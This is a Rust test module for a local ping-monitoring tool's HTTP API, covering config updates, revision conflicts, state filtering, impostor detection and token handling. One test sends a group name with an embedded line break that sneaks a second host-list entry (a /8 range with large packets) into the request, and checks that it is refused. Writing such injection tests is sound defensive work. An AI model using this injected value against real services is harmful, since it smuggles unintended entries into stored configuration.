        let stale = json!({ "hosts_text": "192.0.2.9", "hosts_rev": first });
        assert_eq!(api_json(b, "PUT", "/api/v1/config", Some(stale)).0, 409);
        remove_folder(&a_path);
        remove_folder(&b_path);
    }

    #[test]
    fn what_get_config_gives_can_be_sent_back_with_one_change() {
        let cfg = Config { settings: config::default_settings(), hosts_text: "127.0.0.1 Loopback".into(), commands_locked: true, ..test_config() };
        let (path, port) = test_server("roundtrip", cfg);
        api_json(port, "POST", "/api/v1/control", Some(json!({ "action": "ping_now" })));
        let pinged = || api_json(port, "GET", "/api/v1/state", None).1["hosts"][0]["sent"].as_u64().unwrap_or(0);
        let deadline = std::time::Instant::now() + Duration::from_secs(10);
        while pinged() == 0 {
            assert!(std::time::Instant::now() < deadline, "the ping came back");
            std::thread::sleep(Duration::from_millis(20));
        }

        let (_, mut whole) = api_json(port, "GET", "/api/v1/config", None);
        for read_only in ["schema_version", "groups", "commands_locked", "config_path"] {
            assert!(whole.get(read_only).is_some(), "GET /config gives {read_only}");
        }
        whole["settings"]["timeout_ms"] = json!(650);
        // Read-only fields are left as they are, whatever is sent for them.
        whole["commands_locked"] = json!(false);
        let (status, reply) = api_json(port, "PUT", "/api/v1/config", Some(whole));
        assert_eq!(status, 200, "{reply}");
        let (_, now) = api_json(port, "GET", "/api/v1/config", None);
        assert_eq!((now["settings"]["timeout_ms"].as_u64(), now["commands_locked"].as_bool()), (Some(650), Some(true)));
        assert!(config::on_disk(&path).unwrap().commands_locked);
        assert!(pinged() > 0, "the list sent back is the one in use, so its counters stay");
        // A name that is not one of GET's is still refused.
        let (status, reply) = api_json(port, "PUT", "/api/v1/config", Some(json!({ "group": ["Lab"] })));
        assert_eq!(status, 400, "{reply}");
        remove_folder(&path);
    }

    #[test]
    fn an_unmute_is_not_undone_by_a_settings_change_at_the_same_moment() {
        use std::sync::atomic::AtomicBool;
        let (path, port) = test_server("mutes", Config { hosts_text: "192.0.2.1\n192.0.2.2".into(), ..test_config() });
        let id = api_json(port, "GET", "/api/v1/state", None).1["hosts"][0]["id"].as_u64().unwrap();
        let stop = Arc::new(AtomicBool::new(false));
        let changer = {
            let stop = stop.clone();
            std::thread::spawn(move || {
                let mut n = 0;
                while !stop.load(Ordering::SeqCst) {
                    n += 1;
                    api_json(port, "PUT", "/api/v1/config", Some(json!({ "settings": { "timeout_ms": 500 + n % 100 } })));
                }
            })
        };
        for _ in 0..60 {
            api_json(port, "POST", "/api/v1/hosts", Some(json!({ "action": "mute", "ids": [id] })));
            api_json(port, "POST", "/api/v1/hosts", Some(json!({ "action": "unmute", "ids": [id] })));
            let (_, state) = api_json(port, "GET", "/api/v1/state", None);
            assert_eq!(state["hosts"][0]["enabled"], true, "unmuted, and still unmuted");
        }
        stop.store(true, Ordering::SeqCst);
        changer.join().unwrap();
        assert!(config::on_disk(&path).unwrap().muted.is_empty());
        remove_folder(&path);
    }

    #[test]
    fn an_older_pingtable_and_a_silent_listener_are_told_apart_from_an_impostor() {
        // pingtable 0.3.0 does not know the question and wants the token.
        let body = r#"{"error":"Missing or wrong token. Open the link pingtable printed when it started."}"#;
        let (old, heard) = impostor(1, move |_| format!("HTTP/1.1 401 Unauthorized\r\nContent-Length: {}\r\n\r\n{body}", body.len()));
        assert_eq!(prove(old, TOKEN), Err(LocalError::Older));
        assert!(!heard.join().unwrap().contains(TOKEN));
        // Any other refusal is another program, not an older pingtable: a web
        // server that does not know the path, or one that wants its own login.
        let not_found = "<html><body>Error response, 404 File not found</body></html>";
        let (web, heard) = impostor(1, move |_| format!("HTTP/1.0 404 File not found\r\nContent-Length: {}\r\n\r\n{not_found}", not_found.len()));
        assert_eq!(prove(web, TOKEN), Err(LocalError::Unproven));
        assert!(!heard.join().unwrap().contains(TOKEN));
        let login = r#"{"error":"Log in first."}"#;
        let (other, heard) = impostor(1, move |_| format!("HTTP/1.1 401 Unauthorized\r\nContent-Length: {}\r\n\r\n{login}", login.len()));
        assert_eq!(prove(other, TOKEN), Err(LocalError::Unproven));
        assert!(!heard.join().unwrap().contains(TOKEN));

        // Takes the connection and says nothing.
        let silent = TcpListener::bind("127.0.0.1:0").unwrap();
        let port = silent.local_addr().unwrap().port();
        let holder = std::thread::spawn(move || {
            let (mut stream, _) = silent.accept().unwrap();
            stream.set_read_timeout(Some(Duration::from_secs(5))).unwrap();
            let mut heard = Vec::new();
            let _ = stream.read_to_end(&mut heard);
            String::from_utf8_lossy(&heard).into_owned()
        });
        assert_eq!(prove(port, TOKEN), Err(LocalError::NoReply));
        assert!(!holder.join().unwrap().contains(TOKEN));

        // Each says what to do.
        assert!(LocalError::Older.explain(7464).contains("older pingtable"));
        assert!(LocalError::NoReply.explain(7464).contains("try again"));
        assert!(LocalError::Unproven.explain(7464).contains("Another program"));
        assert_eq!(port_taken(7464, &LocalError::NotRunning), "Port 7464: the port is already in use by another program; pick another with --port.");
    }

    #[test]
    fn the_table_can_be_read_a_part_at_a_time() {
        let (path, port) = test_server("parts", Config { hosts_text: "127.0.0.1\n127.0.0.2\n127.0.0.3".into(), ..test_config() });
        let (_, whole) = api_json(port, "GET", "/api/v1/state", None);
        assert!(whole.get("matched").is_none(), "{whole}");
        let first = whole["hosts"][0]["id"].clone();
        api_json(port, "POST", "/api/v1/hosts", Some(json!({ "action": "mute", "ids": [first] })));

        let (_, muted) = api_json(port, "GET", "/api/v1/state?state=muted", None);
        assert_eq!((muted["matched"].as_u64(), muted["hosts"].as_array().unwrap().len()), (Some(1), 1));
        assert_eq!(muted["hosts"][0]["host"], "127.0.0.1");
        let (_, some) = api_json(port, "GET", "/api/v1/state?state=pending%2Cmuted&limit=2", None);
        assert_eq!((some["matched"].as_u64(), some["hosts"].as_array().unwrap().len()), (Some(3), 2));
        assert_eq!(some["counts"]["total"], 3, "the counts still cover the whole table");

        let (status, bad) = api_json(port, "GET", "/api/v1/state?state=gone", None);
        assert_eq!(status, 400);
        assert!(bad["error"].as_str().unwrap().contains("no state \"gone\""), "{bad}");
        assert_eq!(api_json(port, "GET", "/api/v1/state?limit=many", None).0, 400);

        // Changes since a point cannot be filtered: a row that left the states asked
        // for would never be reported, and rows cut off by the limit would be lost.
        let seq = whole["seq"].as_u64().unwrap();
        for filtered in [format!("since={seq}&state=muted"), format!("since={seq}&limit=1"), "since=1&state=up&limit=5".to_string()] {
            let (status, reply) = api_json(port, "GET", &format!("/api/v1/state?{filtered}"), None);
            assert_eq!(status, 400, "{filtered}: {reply}");
            assert!(reply["error"].as_str().unwrap().contains("cannot be used with since"), "{reply}");
        }
        assert_eq!(api_json(port, "GET", &format!("/api/v1/state?since={seq}"), None).0, 200);
        assert_eq!(api_json(port, "GET", "/api/v1/state?since=0&state=muted", None).0, 200);
        remove_folder(&path);
    }

    #[test]
    fn a_config_put_with_a_name_it_does_not_know_is_refused() {
        let cfg = Config { settings: config::default_settings(), hosts_text: "127.0.0.1 Loopback".into(), ..test_config() };
        let (path, port) = test_server("unknown", cfg);
        let (status, reply) = api_json(port, "PUT", "/api/v1/config", Some(json!({ "settings": { "timeout": 500 } })));
        assert_eq!(status, 400);
        assert!(reply["error"].as_str().unwrap().starts_with("There is no setting \"timeout\". Did you mean \"timeout_ms\"?"), "{reply}");
        let (status, reply) = api_json(port, "PUT", "/api/v1/config", Some(json!({ "setting": { "timeout_ms": 500 } })));
        assert_eq!(status, 400);
        assert!(reply["error"].as_str().unwrap().starts_with("PUT /config has no field \"setting\". Did you mean \"settings\"?"), "{reply}");
        assert_eq!(api_json(port, "GET", "/api/v1/config", None).1["settings"]["timeout_ms"], 1000, "nothing changed");

        // What the windows send still goes through, field for field as ui/app.js builds it.
        let (_, now) = api_json(port, "GET", "/api/v1/config", None);
        let settings_window = json!({
            "interval_secs": 1, "timeout_ms": 900, "max_concurrent": 256, "payload_size": 32, "ttl": null, "history_per_host": 2000,
            "source_v4": null, "source_v6": null, "repeat": true, "resolve_every_ping": false, "reverse_dns": true,
            "prefer_ipv6": false, "read_mac": true, "dont_fragment": false, "fail_trigger": 2, "recover_trigger": 1,
            "on_down_command": "", "on_up_command": "",
        });
        let (status, reply) = api_json(port, "PUT", "/api/v1/config", Some(json!({ "settings": settings_window, "autostart": true })));
        assert_eq!(status, 200, "Settings: {reply}");
        let list_window = json!({
            "settings": { "description_format": true, "cidr_skip_first": true, "cidr_skip_last": true },
            "hosts_text": "127.0.0.1 Loopback\n::1 IPv6", "hosts_rev": now["hosts_rev"], "keep_stats": true,
        });
        let (status, reply) = api_json(port, "PUT", "/api/v1/config", Some(list_window));
        assert_eq!(status, 200, "host list: {reply}");
        let examples = json!({ "settings": { "description_format": true }, "hosts_text": "127.0.0.1 Loopback", "keep_stats": false });
        let (status, reply) = api_json(port, "PUT", "/api/v1/config", Some(examples));
        assert_eq!(status, 200, "example hosts: {reply}");
        assert_eq!(api_json(port, "GET", "/api/v1/config", None).1["settings"]["timeout_ms"], 900);
        remove_folder(&path);
    }

    #[test]
    fn a_host_list_sent_back_late_does_not_drop_hosts_added_meanwhile() {
        let cfg = Config { settings: config::default_settings(), hosts_text: "127.0.0.1 Loopback".into(), ..test_config() };
        let (path, port) = test_server("rev", cfg);
        let rev_now = || api_json(port, "GET", "/api/v1/config", None).1["hosts_rev"].as_u64().expect("hosts_rev");
        let loaded = rev_now();

        // The list has not changed since it was loaded: applied, with the new revision.
        let body = json!({ "hosts_text": "127.0.0.1 Loopback\n::1 IPv6", "hosts_rev": loaded });
        let (status, reply) = api_json(port, "PUT", "/api/v1/config", Some(body));
        assert_eq!(status, 200, "{reply}");
        let edited = reply["hosts_rev"].as_u64().unwrap();
        assert!(edited > loaded);
        assert_eq!(rev_now(), edited);

        // Something else adds a host while a window still has the old list.
        let (status, _) = api_json(port, "POST", "/api/v1/hosts/add", Some(json!({ "entries": ["127.0.0.2 Added"] })));
        assert_eq!(status, 200);
        let added = rev_now();
        assert_ne!(added, edited);
        let stale = json!({ "hosts_text": "127.0.0.1 Loopback", "hosts_rev": edited, "keep_stats": true });
        let (status, reply) = api_json(port, "PUT", "/api/v1/config", Some(stale));
        assert_eq!(status, 409, "{reply}");
        assert_eq!(reply["error"], "The host list changed while this window was open. Load it again, then make your change.");
        assert_eq!(reply["hosts_rev"].as_u64(), Some(added));
        let (_, now) = api_json(port, "GET", "/api/v1/config", None);
        assert!(now["hosts_text"].as_str().unwrap().contains("127.0.0.2 Added"), "unchanged: {now}");
        assert_eq!(config::on_disk(&path).unwrap().hosts_text, now["hosts_text"].as_str().unwrap());

        // Settings alone change no list and leave the revision as it is.
        let (status, reply) = api_json(port, "PUT", "/api/v1/config", Some(json!({ "settings": { "timeout_ms": 700 } })));
        assert_eq!((status, reply["hosts_rev"].as_u64()), (200, Some(added)));
        // Without a revision a list is applied, as before.
        let (status, reply) = api_json(port, "PUT", "/api/v1/config", Some(json!({ "hosts_text": "127.0.0.1 Loopback" })));
        assert_eq!(status, 200);
        assert!(reply["hosts_rev"].as_u64().unwrap() > added);
        assert_eq!(api_json(port, "GET", "/api/v1/config", None).1["hosts_text"], "127.0.0.1 Loopback");
        // Removing a host from the table moves it too.
        let id = api_json(port, "GET", "/api/v1/state", None).1["hosts"][0]["id"].clone();
        let before = rev_now();
        api_json(port, "POST", "/api/v1/hosts", Some(json!({ "action": "remove", "ids": [id] })));
        assert!(rev_now() > before);
        remove_folder(&path);
    }

    #[test]
    fn a_group_with_a_line_break_is_refused() {
        let (path, port) = test_server("group", test_config());
        let body = json!({ "entries": ["127.0.0.1"], "group": "Lab\n10.0.0.0/8 size=65500" });
        let (status, reply) = api_json(port, "POST", "/api/v1/hosts/add", Some(body));
        assert_eq!(status, 400);
        assert!(reply["error"].as_str().unwrap().contains("one line"), "{reply}");
        assert_eq!(api_json(port, "GET", "/api/v1/config", None).1["hosts_text"], "");
        let (status, _) = api_json(port, "POST", "/api/v1/hosts/add", Some(json!({ "entries": ["127.0.0.1"], "group": "Lab" })));
        assert_eq!(status, 200);
        remove_folder(&path);
    }

    #[test]
    fn the_settings_notice_reaches_one_window_once() {
        let cfg = Config { notice: Some("The settings file could not be read.".into()), ..test_config() };
        let (path, port) = test_server("notice", cfg);
        // A full table read does not use it up.
        let (_, full) = api_json(port, "GET", "/api/v1/state", None);
        assert!(full["notes"].as_array().is_none_or(|n| n.is_empty()), "{full}");
        let (_, first) = api_json(port, "GET", "/api/v1/state?since=1&wait_ms=20000", None);
        let notes = first["notes"].as_array().expect("notes");
        assert_eq!(notes.len(), 1, "{first}");
        assert_eq!((notes[0]["text"].as_str(), notes[0]["sticky"].as_bool()), (Some("The settings file could not be read."), Some(true)));
        let (_, second) = api_json(port, "GET", "/api/v1/state?since=1", None);
        assert!(second["notes"].as_array().is_none_or(|n| n.is_empty()), "{second}");
        remove_folder(&path);
    }

    #[test]
    fn settings_merge_over_what_is_there() {
        let current = config::default_settings();
        let mut changes = serde_json::Map::new();
        changes.insert("fail_trigger".into(), json!(5));
        let merged = merged_settings(&current, Some(changes)).unwrap();
        assert_eq!(merged.fail_trigger, 5);
        assert_eq!(Settings { fail_trigger: current.fail_trigger, ..merged }, current);
        assert_eq!(merged_settings(&current, None).unwrap(), current);
    }

    #[cfg(unix)]
    #[test]
    fn the_redirect_page_is_private_and_holds_the_link() {
        use std::os::unix::fs::PermissionsExt;
        let page = write_redirect(7527, &link(7527, TOKEN)).unwrap();
        assert_eq!(std::fs::metadata(&page).unwrap().permissions().mode() & 0o777, 0o600);
        let html = std::fs::read_to_string(&page).unwrap();
        assert!(html.contains(&format!("url=http://127.0.0.1:7527/?t={TOKEN}")), "{html}");
        assert!(!page.to_string_lossy().contains(TOKEN));
        let _ = std::fs::remove_file(page);
    }

    #[test]
    fn a_chunked_body_is_put_back_together() {
        assert_eq!(unchunk("5\r\nhello\r\n6; note\r\n world\r\n0\r\n\r\n"), "hello world");
        assert_eq!(unchunk(""), "");
        assert_eq!(unchunk("zz\r\nbroken"), "");
    }

    #[test]
    fn ports_are_gathered_from_every_place_once() {
        assert_eq!(chosen_ports(&[8443, 443, 22], "22 9000-9001").unwrap(), [8443, 443, 22, 9000, 9001]);
        assert!(chosen_ports(&[], "").unwrap().is_empty());
        assert!(chosen_ports(&[0], "").unwrap_err().contains("not a port number"));
        assert!(chosen_ports(&[], "https").unwrap_err().contains("not a port number"));
        let many: Vec<u16> = (1..=65).collect();
        assert!(chosen_ports(&many, "").unwrap_err().contains("more than 64"));
    }
}
